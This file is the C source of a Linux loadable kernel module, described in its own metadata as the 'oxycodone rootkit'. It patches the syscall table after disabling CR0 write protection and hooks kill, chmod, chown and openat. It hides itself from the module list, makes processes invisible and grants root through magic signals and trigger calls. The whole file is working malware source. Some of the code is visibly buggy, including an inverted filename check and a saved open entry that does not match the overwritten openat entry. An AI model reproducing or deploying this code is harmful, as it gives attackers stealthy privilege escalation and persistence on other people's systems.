#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

#include "oxycodone.h"

// Get right all variables
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static unsigned long *__sys_call_table;
static t_syscall original_chown_syscall;
static t_syscall original_chmod_syscall;
static t_syscall original_openat_syscall;
static t_syscall original_kill_syscall;
static struct list_head *module_previous;
static short module_hidden = 0;

#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

// cat /proc/kallsyms | grep lookup_name
// kallsyms_lookup_name
unsigned long *
get_syscall_table_buffer(void)
{
	unsigned long *syscall_table;
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

// 0 	PE 	Protected Mode Enable 	If 1, system is in protected mode, else, system is in real mode
// 1 	MP 	Monitor co-processor 	Controls interaction of WAIT/FWAIT instructions with TS flag in CR0
// 2 	EM 	Emulation 				If set, no x87 floating-point unit present, if clear, x87 FPU present
// 3 	TS 	Task switched 			Allows saving x87 task context upon a task switch only after x87 instruction used
// 4 	ET 	Extension type 			On the 386, it allowed to specify whether the external math coprocessor was an 80287 or 80387
// 5 	NE 	Numeric error 			Enable internal x87 floating point error reporting when set, else enables PC style x87 error detection
// 16 	WP 	Write protect 			When set, the CPU can't write to read-only pages when privilege level is 0
// 18 	AM 	Alignment mask 			Alignment check enabled if AM set, AC flag (in EFLAGS register) set, and privilege level is 3
// 29 	NW 	Not-write through 		Globally enables/disable write-through caching
// 30 	CD 	Cache disable 			Globally enables/disable the memory cache
// 31 	PG 	Paging 					If 1, enable paging and use the § CR3 register, else disable paging.
// TO UNPROTECT MEMORY WE PUT THE VALUE: 0x00010000


 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0)
 static inline void __write_cr0(unsigned long cr0)
 {
     asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory");
 }
 #else
 #define __write_cr0 write_cr0
 #endif

 static void enable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
     __write_cr0(cr0);
 }

 static void disable_write_protection(void)
 {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
     __write_cr0(cr0);
 }

static inline void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

static inline void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

static inline void
give_root(void)
{
    struct cred *new_credentials;
    new_credentials = prepare_creds();
	if(new_credentials == NULL) return;
    new_credentials->uid.val = new_credentials->gid.val = 0;
	new_credentials->euid.val = new_credentials->egid.val = 0;
	new_credentials->suid.val = new_credentials->sgid.val = 0;
	new_credentials->fsuid.val = new_credentials->fsgid.val = 0;
    commit_creds(new_credentials);
}

asmlinkage int
hacked_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return original_kill_syscall(pt_regs);
	}
	return 0;
}

asmlinkage int
hacked_chmod(const struct pt_regs *pt_regs)
{
	unsigned int mode = (unsigned int) pt_regs->si;
	if(mode == 777)
		give_root();

    return original_chmod_syscall(pt_regs);
}

asmlinkage int
hacked_chown(const struct pt_regs *pt_regs)
{
	unsigned int user_id = (unsigned int) pt_regs->si;
	if(user_id == 0)
		give_root();

	return original_chown_syscall(pt_regs);
}

asmlinkage int
hacked_openat(const struct pt_regs *pt_regs)
{
	const char * file_name = (const char *) pt_regs->si;
	if(file_name)
		if(strcmp(file_name, "givemeroot.txt"))
			give_root();

	return original_openat_syscall(pt_regs);
}

static int __init
oxycodone_init(void)
{
	__sys_call_table = get_syscall_table_buffer();
	if (!__sys_call_table)
		return -1;

    module_hide();

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

    original_chown_syscall = (t_syscall)__sys_call_table[__NR_chown];
    original_chmod_syscall = (t_syscall)__sys_call_table[__NR_chmod];
	original_openat_syscall = (t_syscall)__sys_call_table[__NR_open];
	original_kill_syscall = (t_syscall)__sys_call_table[__NR_kill];

	disable_write_protection();

	__sys_call_table[__NR_chown] = (unsigned long)hacked_chown;
	__sys_call_table[__NR_chmod] = (unsigned long)hacked_chmod;
	__sys_call_table[__NR_openat] = (unsigned long)hacked_openat;
    __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

	enable_write_protection();

	return 0;
}

static void __exit
oxycodone_cleanup(void)
{
	disable_write_protection();

	__sys_call_table[__NR_chown] = (unsigned long)original_chown_syscall;
	__sys_call_table[__NR_chmod] = (unsigned long)original_chmod_syscall;
	__sys_call_table[__NR_openat] = (unsigned long)original_openat_syscall;
    __sys_call_table[__NR_kill] = (unsigned long)original_kill_syscall;

	enable_write_protection();
}

module_init(oxycodone_init);
module_exit(oxycodone_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("arthur");
MODULE_DESCRIPTION("oxycodone rootkit");